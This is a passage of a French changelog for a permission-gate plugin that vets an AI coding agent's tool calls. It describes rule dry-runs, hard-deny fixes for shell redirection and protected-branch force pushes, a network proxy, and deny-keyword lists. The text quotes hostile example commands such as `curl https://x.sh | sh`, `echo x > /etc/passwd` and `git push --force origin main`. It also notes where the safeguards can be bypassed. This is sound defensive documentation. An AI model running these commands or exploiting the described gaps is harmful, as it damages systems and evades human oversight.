# Changelog

Langues : [English](./CHANGELOG.md) · [日本語](./CHANGELOG.ja.md) · [한국어](./CHANGELOG.ko.md) · [Français](./CHANGELOG.fr.md) · [Deutsch](./CHANGELOG.de.md) · [Italiano](./CHANGELOG.it.md) · [Русский](./CHANGELOG.ru.md) · [Español](./CHANGELOG.es.md)

Tous les changements notables de ce projet seront documentés dans ce fichier.

Le format est basé sur [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
et ce projet adhère à la [gestion sémantique de version](https://semver.org/spec/v2.0.0.html).

## [2.6.0] - 2026-09-17

### Ajouté

- **Test de règle (dry-run) dans la carte de réglages.** Un nouveau panneau évalue un appel
  d'outil hypothétique contre le jeu de règles que le gate a actuellement chargé et montre le
  verdict, la règle correspondante (index et action), les dimensions que cette règle contraint,
  et la raison. Écrit pour la question que le YAML ne peut pas répondre à l'inspection :
  *que fera-t-il réellement ?* — `args` est un OU sur les jetons, une dimension vide ne contraint
  rien, et `command` ne correspond qu'au **mot** de commande décomposé, si bien qu'une règle
  d'apparence plausible peut être morte à l'arrivée.

  Le rapport sépare délibérément deux réponses. **`verdict`** est le résultat de politique de
  toute la chaîne (refus dur P0 → mot-clé deny → octroi P1 → règles P2 → ask P4 → permissive).
  **`ruleLayer`** est ce que la chaîne `permissions` décide toute seule, et seule cette couche
  peut nommer un index de règle : un refus dur P0 ou un mot-clé deny de préréglage se déclenche
  *avant* elle et ne laisse aucune règle derrière lui, si bien que le panneau le dit au lieu
  d'imputer une règle sans rapport. `matchedDimensions` énumère de même les dimensions que la
  règle correspondante *contraint*, et non celle qui aurait « causé » la correspondance — les
  dimensions sont combinées par ET, donc une cause unique ne peut pas honnêtement être nommée. Un
  `ruleCount` de 0 est remonté sous la forme « 0 règles chargées, vérifiez le chemin rulesFile »
  plutôt que « rien ne correspondait ».

- **`POST /api/dsh-perm-gate/dry-run`** — l'endpoint du panneau. **Lecture seule par
  construction** : il n'a aucune forme d'écriture, les clés de corps inconnues sont écartées
  plutôt que transmises, et il ne touche jamais les règles, les octrois, l'état d'apprentissage
  ni l'espace de noms des réglages. Tester une règle ne doit pas pouvoir la changer. Il évalue
  contre le runtime **en vigueur** plutôt qu'un runtime neuf, si bien que le panneau teste les
  règles en force — un runtime neuf re-résoudrait la chaîne depuis une racine différente et
  pourrait répondre silencieusement à propos d'un autre fichier.

- **`src/dry-run.ts`** — `runDryRun` / `createDryRunRuntime`, l'évaluateur partagé entre la CLI
  et la route, plus `PermGateRuntime.explainRules` (rapport en lecture seule de la couche de
  règles) et `PermGateRuntime.explainCall` (évaluation de politique pure). `src/cli.ts` est
  désormais un fin emballage par-dessus ; sa sortie est inchangée sur neuf invocations rejouées,
  vérifiée octet par octet (y compris les cas `--list`, sans outil, JSON invalide et chemin
  d'écriture).

### Corrigé

- **Le panneau de test de règle rapportait `allow` pour des appels que les règles renvoient à un
  humain.** La première version évaluait par le chemin orienté hôte, qui applique les couches de
  session — le retrait du préréglage et la dégradation `approval: never` de l'ask. Un dry-run
  sans session n'a pas de session, donc le lecteur de politique répondait « never », tout `ask`
  se dégradait en passe-plat, et le panneau affichait **allow** pour exactement les règles que
  l'on vient justement y vérifier. Mesuré sur l'hôte en direct : `shell ls -la` montrait `allow`
  tandis que la couche de règles de la même carte disait `ask`.

  `runDryRun` rapporte désormais le verdict de **politique pure** issu d'`explainCall` : la même
  chaîne P0 → mot-clé deny → P1 → P2 → P4, avec les couches d'état de session exclues plutôt que
  devinées, et `reason` jamais réduit à un simple `(default/passthrough)`. La vue orientée hôte
  reste disponible sous `input.hostView` ; la CLI la demande, si bien que sa sortie historique
  reste identique octet par octet (re-vérifié : 9/9 cas, SHA256 par cas).

- **La route « en lecture seule » n'était pas en lecture seule.** Elle exécutait le chemin de
  décision orienté hôte contre le runtime en direct, qui ajoute des entrées d'audit et enregistre
  des événements de décision — ouvrir le panneau de test de règle écrivait dans le flux de
  décisions en direct. Le chemin pur n'ajoute rien, et `test/dry-run.spec.ts` affirme désormais
  qu'un appel que le chemin hôte *enregistrerait* laisse le miroir d'audit à zéro.

## [2.5.0] - 2026-09-17

### Ajouté

- **Dimension de règle `branch`** — correspondance de branche git / distante / branche protégée,
  pour qu'une règle puisse enfin dire « pas de push vers une branche protégée » sans attraper des
  commandes sans rapport. Le cas décisif est celui que `args` ne peut jamais exprimer :
  `git push --force origin main` (dangereux) et `git checkout --force main` (routinier) portent
  les *mêmes jetons*, et seule la dimension branche les distingue. Sous-champs : `target` (glob
  de nom de branche, `*` traverse `/`), `remote` (glob de nom de distante) et `shared` (exiger
  une branche protégée). Les candidates viennent du répartiteur de commandes partagé, si bien
  que les formes `refspec` (`HEAD:main`) sont déjà éclatées et qu'un nom de distante n'est jamais
  confondu avec un nom de branche. Documenté dans `docs/rules-format.md` §4.11.

### Corrigé

- **La chaîne de règles multi-fichiers vidait silencieusement chaque dimension correspondante.**
  `resolveRuleChain` fusionnait les entrées à la main avec `tools: []`, `command: []`, `args: []`
  et `paths: []`. Une dimension vide signifie « aucune contrainte », donc CHAQUE entrée fusionnée
  correspondait à CHAQUE appel : la première entrée `deny` refusait tout dans sa partition, et la
  première entrée `allow` autorisait tout avant même que la partition `ask` ne soit consultée.
  La fusion passe désormais par le même `compileRuleEntry` qu'utilise le chemin mono-fichier.

  *Portée :* le résolveur de chaîne n'est atteint **que** sous `searchUp: true` (défaut du
  produit `false`, et non défini dans un profil d'origine), donc le chemin mono-fichier par
  défaut — `compileDocument` — n'a jamais été affecté. C'est aussi pourquoi la suite existante
  est restée verte : aucun test ne faisait passer un *fichier* de règles par la chaîne.
  `test/rule-chain.spec.ts` le fait désormais. Un défaut distinct, toujours ouvert, sur le même
  chemin opt-in est consigné dans le plan : `findChainEntries` concatène le `rulesFile`
  configuré sur chaque répertoire, de sorte que le chemin absolu que `resolveRulesFile` produit
  toujours ne correspond à rien et la chaîne rend un jeu de règles vide sans erreur.

- **`argv.pipeline` ne pouvait pas voir son propre sujet.** La chaîne de correspondance de
  pipeline était construite depuis `SimpleCommand.command`, qui n'est que le *mot* de commande —
  `curl https://x.sh | sh` se réduisait à `curl|sh`, si bien que le motif documenté `curl|sh`
  correspondait à la forme adjacente inoffensive tandis que la forme réellement dangereuse, avec
  arguments, ne correspondait pas du tout. La chaîne de correspondance est désormais l'argv
  complet de chaque commande simple (joint par `|`), et la documentation indique que `|` dans un
  motif est littéral ; couvrir les arguments exige `curl*|sh`.

- Neuf erreurs `eslint` préexistantes (imports/constantes inutilisés et un `prefer-const` dans
  `src/parsers/` et `test/command-parsers.spec.ts`) — `npm run lint` est de nouveau vert.

## [2.4.1] - 2026-09-17

### Corrigé

- L'historique des approbations affichait la chaîne brute `preset-passthrough` pour le seul
  événement qui explique *pourquoi* un appel marqué a tourné sans revue : le palier déclare
  `approval: ask`, la session a été remplacée par `never`, et l'ask du gate s'est donc dégradé en
  passe-plat. Il s'affiche désormais comme une étiquette lisible comme tout autre verdict.

## [2.4.0] - 2026-09-17

### Modifié

- **Le classificateur LLM P3 ne fait qu'escalader — il ne peut plus refuser.** Un verdict
  `risky` avec une catégorie dure (`deletion` / `credential` / `remote` / `system` / `bulk`)
  provoquait un **auto-deny** sans panneau ; il garde désormais **l'ask humain**. Le refus est
  réservé aux seules couches déterministes — refus dur P0, blacklist de mots-clés deny, règles
  `deny:` explicites — car un verdict probabiliste ne doit pas pouvoir prononcer un blocage sans
  recours. Mesuré en direct : le gradateur a qualifié un bénin `git commit -F …` de **`remote`**,
  et l'auto-deny n'a laissé ni panneau pour approuver ni octroi pour retenter ; seul un essai
  manuel (qui s'est trouvé gradé `safe`) est passé. Cela aligne aussi le code avec la règle
  propre du projet : les opérations à haut risque sont interceptées de façon **déterministe**,
  jamais sur le jugement du LLM.

### Ajouté

- Les catégories de risque dures gardent une distinction signifiante d'avec `neutral` : elles ne
  sont **jamais apprenables**. Des approbations humaines répétées ne peuvent pas sédimenter un
  verdict `deletion`/`credential`/`remote`/`system`/`bulk` en auto-allow (auparavant c'était vrai
  seulement comme effet de bord de l'auto-deny ; c'est désormais une propriété explicite).

### Notes de comportement

- Sous `approval: never`, un ask que le gate ne peut pas délivrer se dégrade toujours en
  passe-plat, si bien qu'un appel signalé par le classificateur **tourne** désormais là où il
  était autrefois auto-refusé. C'est la conséquence directe de « ne refuser que ce qui est
  déterministement dangereux, négocier tout le reste » : une négociation exige un humain, et
  `never` signifie qu'il n'y en a pas. Faites tourner le gate sur un palier dont l'`approval` est
  `ask` pour que les signaux vous parviennent.

## [2.3.0] - 2026-09-17

### Ajouté

- **Un retrait n'est plus silencieux.** Quand le préréglage de permissions de la session est
  en dehors de `gatePresets`, le gate se retirait sans rien enregistrer — l'appel d'outil
  ressemblait donc exactement à un appel que le gate avait inspecté et autorisé. Il enregistre
  désormais **un** avis `stand-down` par transition (session, préréglage) (jamais par appel),
  nommant le préréglage, le périmètre et le fait que le refus dur P0 est inactif. Le navigateur
  le rend sous forme de bandeau persistant **GATE OFF** au-dessus de la saisie, et l'historique
  des approbations montre une étiquette `Gate off`.
- La carte de réglages 自动审查 énonce le périmètre propre du gate en préréglages (`gatePresets`,
  défaut `permissive` / `permissive-full`) et ce qui se passe en dehors, si bien que le périmètre
  est visible là où le palier est configuré.

### Modifié

- **Le positionnement documenté de P0 est délimité, pas global.** Le refus dur P0 est monotone et
  non négociable *dans le périmètre de préréglages du gate* ; entre préréglages, le gate se
  retire entièrement — P0 compris — parce que la politique propre au palier sélectionné possède
  cette session. Le code s'est toujours comporté ainsi ; `AGENTS.md` et les quatre README
  affirmaient le contraire, ce qui faisait lire `danger-full-access` comme « P0 s'applique
  toujours ». Définissez `gatePresets: ['*']` pour rendre P0 global à nouveau.

### Corrigé

- `DEFAULT_GATE_PRESETS` / `resolveGatePresets` ont déménagé de `config.ts` (qui importe
  schemastery) vers le `preset.ts` sans dépendances, si bien que la moitié navigateur peut rendre
  le périmètre sans tirer une dépendance node-only dans le bundle client. `config.ts` ré-exporte
  les deux ; les imports existants sont inchangés.

## [2.2.0] - 2026-09-17

### Corrigé

- **Le refus dur P0 sautait tous les outils shell sauf quatre.** `hardDenyReason` conditionnait
  son inspection shell sur une regex définie localement, `/^(?:bash|pwsh|sh|cmd)$/`, qui ne
  correspond **pas** à `shell`, `terminal` ni `powershell`. `shell` est l'outil shell principal
  de DSH, si bien que toute la vérification shell de P0 — le garde de redirection sur chemin
  protégé — était **inerte pour la forme d'appel la plus courante**. Mesuré, même commande
  `echo x > /etc/passwd` : bloqué via `bash`, **autorisé** via `shell`. `engine.ts` importe
  désormais `SHELL_TOOLS` depuis `evaluate.ts` ; le gate détenait trois copies de ce seul fait et
  une seule était complète.
- **`git push --delete` était analysé comme un push ordinaire.** `hasDelete` était calculé dans
  `analyzeSubcommand` mais jamais lu que dans le cas `branch`, si bien que `git push --delete
  origin main` tombait dans la branche push simple (`destructiveness: 4`) et l'entrée
  `'push-delete': 5` de `DESTRUCTIVENESS_MAP` était une donnée morte.
- **La détection de branche protégée se déclenchait à tort sur tout nom contenant une barre
  oblique.** Le prédicat supprimait tout ce qui précédait le dernier `/`, si bien que
  `backup/main` et `feat/release` étaient lus comme protégés. Il ne supprime désormais que les
  préfixes de ref connus (`refs/heads/`, `refs/tags/`, `refs/remotes/<distante>/`). Le sens
  compte : ce prédicat alimente un P0 **irrétractable**, où un raté garde encore derrière lui les
  couches mot-clé / règle / LLM, tandis qu'un faux positif bloque un flux de travail légitime
  sans aucun recours.

### Ajouté

- **Refus dur P0 pour la réécriture d'historique distant sur une branche protégée.** Un
  `git push` qui écrase en force ou supprime `main` / `master` / `production` / `release` /
  `stable` est rejeté de façon déterministe, avant tout appel LLM. La protection préexistante
  était le mot-clé plat, aveugle aux branches et surchargeable par espace de noms
  `'push --force'` ; ceci est le plancher non négociable en dessous.
  - **Escalade seule par construction, pas par convention** : l'aide renvoie
    `string | undefined`, que l'appelant lit comme deny / non tranché. Elle n'a aucun moyen
    d'exprimer allow, si bien que la brancher dans P0 ne peut pas élargir ce que le gate permet.
  - Délibérément **non** couvert (toujours laissé aux couches mot-clé / règle / LLM) : le
    force-push vers une branche non protégée, `git push --force` sans branche nommée, et les
    pushes ordinaires.
  - Premier usage en production de l'analyseur de commandes (`command-dispatcher`,
    `command-semantics`, `parsers/git`, `parsers/shell-cmds`), jusque-là référencé uniquement par
    son propre fichier de test.

### Tests

- Nouvelle suite `test/git-protected-push.spec.ts` (13 cas) : variantes de l'analyseur, le
  prédicat de branche protégée dans les deux sens, couverture complète de `SHELL_TOOLS`, les
  quatre formes délibérément autorisées, et la segmentation des commandes composées
  (`git status && git push --force origin main`).
- **Falsifié** : revenir sur chacun des trois correctifs rend rouges exactement les cas qui les
  gardent (7 échecs au total), tandis que les cas d'autorisation délibérée restent verts.
- Suite complète : **40 fichiers / 459 cas** ; `typecheck` propre.

## [2.1.2] - 2026-09-15

### Ajouté

- **Le patch de glyphe du composer voyage désormais avec le paquet.** `scripts/patch-permission-glyph.mjs`
  est mis sur liste blanche dans `files` et exposé comme le bin **`dsh-perm-gate-patch-glyph`**,
  si bien que ré-appliquer le patch du bundle hôte après une mise à niveau de DSH ne requiert
  plus de checkout des sources :

  ```sh
  npx dsh-perm-gate-patch-glyph            # apply
  npx dsh-perm-gate-patch-glyph --check    # report only; exits 1 if the glyph is missing
  ```

  Dans un checkout, `npm run patch:glyph` et `npm run patch:glyph:check` font de même.

  Il est délibérément **pas** un `postinstall`. Le script modifie un paquet **hôte**, et un
  plugin ne doit pas réécrire le harnais dans lequel il est installé sans y être invité.
  (pnpm 10+ bloque les scripts d'installation par défaut sauf mise sur liste blanche ; un
  `postinstall` aurait donc aussi été une promesse qui ne s'exécute jamais en silence — pire
  qu'une commande explicite.)

### Modifié

- Le script est désormais testable : ses parties pures sont exportées (`sliceEntry`,
  `applyGlyphPatch`, `candidateBundles`, `findBundle`) et épinglées par `test/glyph-patch.spec.ts`
  (11 cas). L'invariant d'équilibre des crochets est celui qui compte — la première version du
  découpeur scannait depuis le mauvais crochet et produisait un bundle non analysable, que seul le
  garde `node --check` propre au script attrapait.
- `candidateBundles` sonde en plus la portée par profil hissée sous `$DSH_HOME`, et la CLI est un
  no-op quand elle est importée (le bloc principal ne tourne que lorsque le fichier est le point
  d'entrée).

## [2.1.1] - 2026-09-15

### Ajouté

- **Surface d'exécution réseau (opt-in, désactivée par défaut).** Un proxy local HTTP/CONNECT
  arbitre le trafic sortant des *sous-processus shell* selon le même fichier de règles, plus un
  chemin d'approbation interactif pour les cibles qu'aucune règle ne couvre. Une règle `deny`
  n'est jamais escaladée — l'approbation élargit la portée d'une cible non répertoriée, mais ne
  peut jamais annuler une règle qui dit non. Nouvelle configuration : `networkEnabled` (défaut
  `false`), `networkMode`, `networkUnlisted`, `networkUnattributed`, `networkBind`, `networkPort`,
  `networkNoProxy`, `networkInjectEnv`, `networkAskTimeoutMs`, `networkGrantTtlMs`. Diagnostics à
  `GET /api/dsh-perm-gate/network`. Couvert par `test/network.spec.ts`, `test/proxy-errors.spec.ts`,
  `test/network-lifecycle.spec.ts` et `test/network-approval.spec.ts`.
- **Deux paliers 自动审查.** `permissive` conserve la sandbox de fichiers intégrée ;
  `permissive-full` (libellé 自动审查（高权限）) couple le même comportement d'approbation à
  `danger-full-access`. Le `sandbox` et l'`approval` d'un préréglage sont des réglages
  indépendants, et leur couplage imposait un compromis : la sandbox `workspace-write` refuse
  aussi les tubes nommés dont un processus enfant a besoin pour démarrer, si bien que `git clone`,
  le `sh.exe` MSYS2/Cygwin et ConPTY échouaient sous l'unique palier où le gate était actif.
  Les deux paliers sont dans les `gatePresets` par défaut.
- **Extension du modèle de règles.** Six nouvelles dimensions de correspondance (`params` /
  `absent` / `agents` / `when` / `argv` / `network`), une chaîne de règles multi-fichiers avec
  `searchUp` et un chemin de repli, et une détection d'ombre pour les règles inatteignables.
  Nouvelle configuration : `searchUp`, `fallbackPath`, `badFilePolicy`, `maxChainLength`.
- **Rechargement à chaud des règles.** Un observateur chokidar recharge les fichiers de règles
  effectifs, avec anti-rebond, éviction LRU entre espaces de travail, et surveillance des
  fichiers candidats via l'ancêtre existant le plus profond, pour qu'un fichier de règles créé en
  cours de session soit adopté. Nouvelle configuration : `watch` (défaut `true`),
  `watchDebounceMs`.

### Corrigé

- **Une connexion bloquée pouvait tuer l'hôte.** Quand le proxy répondait 403 à un CONNECT, le
  RST du client produisait un `ECONNRESET` sans gestionnaire attaché, qui escaladait en un
  événement `'error'` non géré et terminait le processus DSH. Les gestionnaires d'erreurs de
  socket sont désormais attachés à la connexion, avec des filets `clientError` et de rejet de
  gestionnaire derrière. Un proxy de politique ne doit jamais faire tomber son hôte.
- **Les outils intégrés demandaient une approbation.** La liste auto-allow était maintenue à la
  main, si bien que les outils ajoutés à DSH depuis en étaient sortis et qu'un appel en lecture
  seule pouvait lever une invite d'approbation : `advanced_search`, `platform_search`,
  `free_search_test`, `context_compression_retrieve`, `memory_search_graph`,
  `memory_expand_graph_node`, `memory_import`, `memory_ruminate`, `memory_ruminate_cancel`,
  `memory_ruminate_status`.
- **Courses de cycle de vie du proxy.** `close()` attend désormais une liaison en cours au lieu
  de la devancer, est borné, et des appels `start()` simultanés partagent une seule liaison. Les
  résolutions DNS sont bornées dans le temps, la phase d'établissement de connexion est bornée,
  les connexions simultanées sont plafonnées, et un logger qui lance ne peut plus escalader en
  crash. Le démantèlement du proxy est enregistré avant l'attente de la liaison, si bien qu'un
  dispose précoce ne peut pas fuiter un port lié ni un `process.env` réécrit.
- **`permissive-full` n'avait pas d'icône dans le sélecteur du composer.** La table de glyphes du
  sélecteur est fermée et, selon son propre commentaire, n'attribue rien aux noms configurés par
  l'hôte, si bien que 自动审查（高权限） s'affichait en texte seul tandis que 自动审查 montrait
  bouclier+œil. `scripts/patch-permission-glyph.mjs` ajoute l'entrée manquante à cette table
  **hôte** : idempotent, découpage par profondeur de crochets, et il `node --check` sa propre
  sortie et restaure la sauvegarde en cas d'échec. Il patche un paquet hôte ; il faut donc le
  relancer après chaque mise à niveau de DSH — réinstaller le plugin ne le restaure **pas**, car
  `dsh plugin … add` n'écrit que le `node_modules` propre au profil. Documenté dans les quatre
  guides d'installation.

### Modifié

- `networkUnattributed` vaut `allow` par défaut : le trafic sans attribution shell est le client
  propre de DSH (un outil réseau intégré, le transport LLM), et l'examiner permettrait à l'hôte de
  se bloquer lui-même. Définissez `deny` pour le comportement plus strict.
- `networkUnlisted` vaut `ask` par défaut.
- `DEFAULT_GATE_PRESETS` vaut désormais `['permissive', 'permissive-full']`.

### Documenté

- **Le proxy réseau est une couche de politique coopérative, pas une frontière d'application.**
  Il ne voit que les clients qui lisent l'environnement proxy. Mesuré, pas supposé : `curl` passe
  par lui, tandis que `node` `http`/`https`/`fetch` se connecte directement, comme les sockets
  bruts, le DNS, QUIC, les cibles en IP littérale et les clients par défaut Java/.NET. Énoncé
  dans les quatre README.

- **Nettoyage des sessions — la chaîne d'autorisation suit désormais le cycle de vie de la
  session.** Au démarrage du plugin puis chaque heure, le gate lit le magasin d'espaces de
  travail de DSH (`$DSH_HOME/storages/workspace.json`, en lecture seule) et classe chaque session
  pour laquelle il détient des données du gate. Les sessions que DSH a archivées
  (`global.archivedSessionIds`) ou ne suit plus du tout voient leurs événements de décision
  retirés de `$DSH_HOME/perm-gate/events.jsonl` (réécriture atomique tmp+rename, seulement si
  quelque chose est retiré) et leurs fichiers d'instantanés pré-modification supprimés de
  `$DSH_HOME/perm-gate/snapshots/`. Les sessions vivantes ne sont pas touchées ; les lignes
  inattribuables (identifiant de session vide, ligne/fichier inparsable) ne sont jamais
  supprimées ; chaque échec d'E/S est fail-open (la passe est ignorée et retentée une heure plus
  tard) ; le minuteur horaire est `unref`'é et libéré avec le plugin. Nouvelle configuration :
  `sessionSweep` (défaut `true`), `workspaceStoreFile` (défaut
  `<dshHome>/storages/workspace.json`). Noter que restaurer une session archivée ne restaure pas
  son historique nettoyé. Couvert par `test/session-sweep.spec.ts` (13 cas unitaires) et
  `test/session-sweep-apply.spec.ts` (câblage de bout en bout).

## [2.0.0] - 2026-09-11

### Corrigé

- **Le gate se retirait sur chaque appel sous DSH 0.1.2, si bien que la page Approvals restait
  vide.** Le pli du préréglage de permissions de la session lisait le journal comme
  `exec.agent.session.events`. DSH 0.1.1 exposait ce tableau ; 0.1.2 a rendu le journal privé
  derrière `Session.snapshotEvents()` / `ownEvents()` et n'a gardé aucun membre `events`, donc la
  lecture renvoyait `undefined`, `presetOf` répondait `undefined`, et
  `presetInScope(undefined, ['permissive'])` rendait `gateActive` faux pour **chaque** appel :
  aucune décision de règle, d'octroi, de mot-clé deny, de classificateur ou de refus dur P0, et
  aucun événement d'audit — y compris dans les sessions qui avaient sélectionné le palier propre
  du gate, d'où l'affichage « 本会话暂无审批记录 » plutôt qu'une erreur. Le pli lit désormais le
  journal à travers toutes les formes d'accesseur connues (tableau `events`, `snapshotEvents()`,
  `ownEvents()`) et ne se dégrade en « aucun événement » que lorsque l'hôte n'en expose aucun ;
  le cache du pli se clé sur la longueur du journal plus l'identité de son dernier événement, car
  un instantané 0.1.2 est un tableau neuf sur les mêmes événements figés à chaque lecture.
  `test/preset-scope.spec.ts` épingle les deux formes : une session de forme `0.1.2` doit donner
  une décision (et un événement enregistré), et un journal grandi doit re-plier pour qu'un
  changement de préréglage prenne effet dès l'appel suivant.

### Modifié

- **La série de versions de la ligne `main` devient `2.x`, suivant la ligne DSH qu'elle sert.**
  `1.x` est la ligne DSH `<= 0.1.1` et `2.x` la ligne DSH `0.1.2+`, si bien qu'une version du
  plugin dit pour quel DSH elle a été construite ; `2.0.0` est la première sortie de la nouvelle
  série et les sorties `0.2.x` (`0.2.0`, `0.2.1-beta.2`…`beta.5`) sont remplacées par elle. Les
  majeures se cloisonnent — `^1.0.0` ne résout pas `2.0.0` et `^2.0.0` ne résout pas `1.0.0` —
  si bien qu'une installation existante `^0.2.1-beta.4` (qui ne résout pas `2.0.0` non plus)
  doit être avancée délibérément. `engines.dsh` énonce la même séparation
  (`>=0.1.2-alpha.1 <0.2.0-0` ici, `>=0.1.0-rc.7 <0.1.2-alpha.1` sur `legacy`), mais DSH ne le
  lit jamais : ce sont les plages de versions et les dist-tags qui maintiennent un vieux DSH sur
  `1.x`.
- **Le palier de permissions est étiqueté 自动审查 sur chaque surface, sans icône.** Le `name:` du
  préréglage dans `cordis.patch.yml` est désormais la chaîne produit chinoise, et la ligne par
  défaut des réglages généraux, le sélecteur du composer et l'onglet de réglages du plugin
  l'affichent tous. DSH 0.1.2 rend verbatim le `name:` d'un palier apporté par un plugin et ne
  localise que les trois valeurs intégrées (`仅可查看` / `工作区内修改` / `完全权限`) ; la seule
  chaîne fournie par l'hôte est donc ce qu'une session zh voit ; la valeur machine du palier
  reste `permissive`, celle que `gatePresets` correspond. La décoration d'icône du sélecteur de
  permissions est retirée (`src/client/permission-icon.ts` supprimé) : elle existait pour égaler
  le glyphe bouclier du palier `auto` retiré, elle s'appliquait à la ligne de réglages via le
  sélecteur `aria-haspopup="menu"` de 0.1.2, et un palier de plugin ne dessine aucun glyphe car
  les glyphes du composer ne sont indexés que sur les valeurs intégrées.

## [0.2.1-beta.4] - 2026-09-11

### Ajouté

- Stratégie `trustEscalation` dans le palier Permissive (active par défaut tant que le palier
  l'est) : une approbation d'escalade de sandbox pour un appel que ce gate a déjà autorisé reçoit
  ici la réponse `allowed-once` au lieu de vous le demander. L'escalade est levée par
  `approveEscalation` depuis *l'intérieur* du corps de l'outil shell / pwsh / edit — après que
  `tools/pre-execute` s'est soldé — si bien que l'allow propre du gate ne l'atteignait jamais et
  qu'un appel gradé `safe` par le LLM vous demandait quand même d'approuver l'élargissement.
  Seul l'appel exact que le gate avait dégagé (reconnu par `callId` et nom d'outil) saute
  l'invite, et seulement pour une raison d'escalade reconnue nommant `workspace-write` /
  `danger-full-access` ; tout le reste délègue à l'humain à l'identique. La réponse automatique
  est enregistrée sur le flux d'événements (`verdict:"escalation-auto"`, `mode:<cible>`).
  Désactivez l'interrupteur pour garder l'élargissement de sandbox sous contrôle humain.

### Corrigé

- La carte de réglages amorce désormais la liste blanche éditable depuis le fichier de règles.
  `installSettingsSection` appelait `scope.set('allowlist', …)` sur la portée de réglages de
  **l'hôte**, qui n'expose que `get` / `watch` / `update` / `replace` — `set(field, value)` est
  l'enveloppe de confort du *client* par-dessus `mutate()`, un objet différent — si bien que
  l'appel lançait et que l'espace de noms restait non amorcé. Il utilise désormais
  `scope.update({ allowlist: … })`.
- L'écouteur `approval/request` est enregistré en `prepend` et devient une porte de réponse
  plutôt qu'un observateur passif, si bien qu'il siège devant le pont distant qui rend l'invite
  navigateur. Un écouteur derrière ce pont ne pouvait qu'enregistrer une invite déjà affichée.
- La moitié navigateur n'importe plus `@deepseek-ai/dsh-client-runtime`, que DSH a retiré dans
  `0.1.2-alpha.1`. `ClientContext` vient désormais de `@deepseek-ai/cordis` — l'alias que DSH
  0.1.1 définissait comme `export type ClientContext = Context`, donc il nomme le même type sur
  les deux lignes — et la carte de réglages déclare localement les quatre membres de portée
  qu'elle utilise (`SettingsScopeLike`), le même motif de face locale que la moitié hôte emploie
  déjà pour le service `settings` de l'hôte. Le contrat client est identique octet par octet sur
  les deux lignes ; seul son paquet d'exportation a déménagé.

### Modifié

- La compatibilité DSH se livre désormais sous forme de **deux branches de longue durée**, chacune
  avec sa propre série de versions, son `engines.dsh` et son dist-tag npm : `main` / `0.2.x` /
  `>=0.1.2-alpha.1 <0.2.0-0` / `latest`, et `legacy` / `1.x` / `>=0.1.0-rc.7 <0.1.2-alpha.1` /
  `legacy`. Cette branche est `main`. Voir `RELEASING.md` pour la disposition des branches et le
  flux de cherry-pick.
- Sur cette ligne, `ctx.slots` est déclaré par `@deepseek-ai/dsh-client-ui-renderer/client` — à
  partir de `0.1.2-alpha.1`, `@deepseek-ai/dsh-client-runtime` n'existe plus — l'entrée client
  l'importe donc.
- Les planchers de devDependency client passent de `^0.1.0-rc.7` à `^0.1.5-rc.2`, et
  `@deepseek-ai/dsh-client-ui-renderer` s'ajoute. L'ancien plancher signifiait que la compilation
  ne pouvait résoudre que le jeu de paquets 0.1.0-rc.8, si bien que cette ligne n'était jamais
  compilée contre lui.
- `npm run verify:line` (`scripts/verify-line.mjs`) installe les paquets de la ligne de cette
  branche avec `npm install --no-save` et exécute typecheck + tests + build contre eux, si bien
  qu'une compilation compile toujours contre les paquets que la branche livre. `npm run
  verify:lines` est une vérification opt-in de dérive qui compile sur les deux lignes et compare
  les bundles.

## [0.2.1-beta.3] - 2026-09-10

### Ajouté

- `llmAssist` à risque gradué : le LLM personnalisé configuré (tout endpoint compatible OpenAI)
  grade chaque `ask` en `safe` / `risky:<catégorie>` ; les catégories dures (deletion /
  credential / remote / system / bulk) auto-refusent, les dépassements de délai réessaient une
  fois, et tout échec reste fail-closed.
- Apprentissage des verdicts (`riskLearning`, désactivé par défaut ; `riskThreshold` 1–10,
  défaut 3) : les asks à risque neutre confirmés par un humain et réellement exécutés comptent
  vers l'auto-allow de la même opération exacte (reconnaissance par empreinte) — persistés dans
  `$DSH_HOME/perm-gate/learning.json`, jamais dans les règles YAML de l'utilisateur.
- Flux d'événements de décision : chaque décision s'ajoute à
  `$DSH_HOME/perm-gate/events.jsonl` et est servie à
  `GET /api/dsh-perm-gate/events?sessionId=&since=` ; la moitié navigateur montre la dernière
  décision en bandeau d'avis au-dessus de la saisie de conversation.
- L'icône du sélecteur de permissions décore désormais aussi le déclencheur replié.
- Page des registres d'approbation : la vue de conversation gagne un onglet **Approvals**
  listant les décisions du gate de la session du plus récent au plus ancien (chronologie avec
  étiquettes de type, catégorie de risque et heure) ; la liste blanche de la carte de réglages
  devient une liste de règles éditable avec suppression par ligne et bascule d'édition en masse.
- Sédimentation de l'apprentissage (`riskSediment`, actif par défaut) : les échantillons
  confirmés d'une clé au seuil deviennent des règles auto-allow déterministes — les
  correspondances exactes d'empreinte sautent carrément l'appel LLM et survivent à
  l'interrupteur llmAssist ; la carte de réglages les liste avec terminaison par clé et
  suppression par échantillon (dosée par `GET/POST /api/dsh-perm-gate/learning`).
- Récepteur llmAssist sélectionnable : **API personnalisée** (compatible OpenAI, avec préréglages
  d'endpoint dont Xiaomi MiMo `https://api.xiaomimimo.com/v1`) ou **groupe de modèles hôte DSH**
  (service `llm` + `agentDefaultModel.currentSelection`, fournisseur/modèle remplaçable) — plus
  un bouton de **test de santé** (`POST /api/dsh-perm-gate/health`) qui exécute une complétion
  minimale et rapporte la latence. La carte lit le catalogue en direct des fournisseurs/groupes
  de modèles (host `llm.listProviders`/`listModels` — groupes personnalisés configurés par
  l'utilisateur compris) via `GET /api/dsh-perm-gate/receiver` et montre la sélection effective
  de fournisseur/modèle.
- Blacklist de mots-clés deny en préréglage héritée de dsh-approval-gate
  (`DEFAULT_DENY_KEYWORDS`) : une correspondance de mot-clé insensible à la casse met son veto à
  l'appel avant la liste blanche / les octrois / le LLM ; éditable en liste dans la carte de
  réglages avec étiquettes de préréglage et restauration en un clic ; non définie ou vide,
  le préréglage s'applique (la blacklist ne se désactive jamais en silence).
- **Plan de revue des registres d'approbation** : les fichiers affectés de chaque décision sont
  instantanés avant que la modification n'atterrisse (≤ 5 fichiers, ≤ 256 Ko chacun) sous
  `$DSH_HOME/perm-gate/snapshots/` ; l'onglet **Approvals** transforme ces fichiers en pastilles
  cliquables qui ouvrent un diff de lignes (`GET /api/dsh-perm-gate/diff`) avec une action de
  **revert** délivrant une instruction de restauration dans la conversation
  (`POST /api/dsh-perm-gate/revert`), plus une barre d'inventaire des instantanés
  (`GET /api/dsh-perm-gate/snapshots-stats`, `POST /api/dsh-perm-gate/snapshots-clear`, par
